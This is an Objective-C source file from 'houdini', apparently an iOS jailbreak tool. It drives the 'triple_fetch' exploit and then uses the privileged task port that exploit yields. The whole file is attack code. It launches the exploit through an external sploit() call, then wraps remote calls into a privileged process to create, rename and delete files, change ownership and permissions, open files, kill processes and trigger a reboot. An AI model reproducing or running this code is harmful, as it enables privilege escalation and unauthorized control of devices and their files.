//
//  triple_fetch_strategy.m
//  houdini
//
//  Created by Abraham Masri on 12/7/17.
//  Copyright © 2017 cheesecakeufo. All rights reserved.
//

#import <Foundation/Foundation.h>

#include "utilities.h"
#include "task_ports.h"
#include "triple_fetch_remote_call.h"
#include "post_exploit.h"
#include "strategy_control.h"

// the port is set once the exploit is run
mach_port_t strategy_priv_port = MACH_PORT_NULL;


// kickstarts the exploit
kern_return_t strategy_start () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    extern mach_port_t sploit();
    strategy_priv_port = sploit();

    if(strategy_priv_port == MACH_PORT_NULL) {
        ret = KERN_FAILURE;
        
        printf("[ERROR]: strategy triple fetch failed!\n");
    }
    
    return ret;
}

// called after strategy_start
kern_return_t strategy_post_exploit () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    refresh_task_ports_list(strategy_priv_port);
    do_post_exploit(strategy_priv_port);

    return ret;
}

void strategy_mkdir (char *path) {
    
    call_remote(strategy_priv_port, mkdir, 1, REMOTE_CSTRING(path));
}


void strategy_rename (const char *old, const char *new) {

    call_remote(strategy_priv_port, rename, 1, REMOTE_CSTRING(old), REMOTE_CSTRING(new));
    
}


void strategy_unlink (char *path) {

    call_remote(strategy_priv_port, unlink, 1, REMOTE_CSTRING(path));
    
}

int strategy_chown (const char *path, uid_t owner, gid_t group) {
    
    return (int) call_remote(strategy_priv_port, chown, 3, REMOTE_CSTRING(path), REMOTE_LITERAL(owner), REMOTE_LITERAL(group));
}


int strategy_chmod (const char *path, mode_t mode) {
    
    return (int) call_remote(strategy_priv_port, chmod, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(mode));
}


int strategy_open (const char *path, int oflag, mode_t mode) {
    
    return remote_open(strategy_priv_port, strdup(path), oflag, mode);
}

void strategy_kill (pid_t pid, int sig) {
    
    call_remote(strategy_priv_port, kill, 2, REMOTE_LITERAL(pid), REMOTE_LITERAL(sig));
}


void strategy_reboot () {
    
    call_remote(strategy_priv_port, readdir, 1, REMOTE_LITERAL(0xf39219));
}

pid_t strategy_pid_for_name(char *name) {
    
    return find_pid_for_path(name);
}

// returns the triple fetch strategy with its functions
strategy triple_fetch_strategy() {
    
    strategy returned_strategy;
    
    memset(&returned_strategy, 0, sizeof(returned_strategy));
    
    returned_strategy.strategy_start = &strategy_start;
    returned_strategy.strategy_post_exploit = &strategy_post_exploit;
    
    returned_strategy.strategy_mkdir = &strategy_mkdir;
    returned_strategy.strategy_rename = &strategy_rename;
    returned_strategy.strategy_unlink = &strategy_unlink;
    
    returned_strategy.strategy_chown = &strategy_chown;
    returned_strategy.strategy_chmod = &strategy_chmod;
    
    returned_strategy.strategy_open = &strategy_open;
    
    returned_strategy.strategy_kill = &strategy_kill;
    returned_strategy.strategy_reboot = &strategy_reboot;
    
    returned_strategy.strategy_pid_for_name = &strategy_pid_for_name;
    
    return returned_strategy;
}
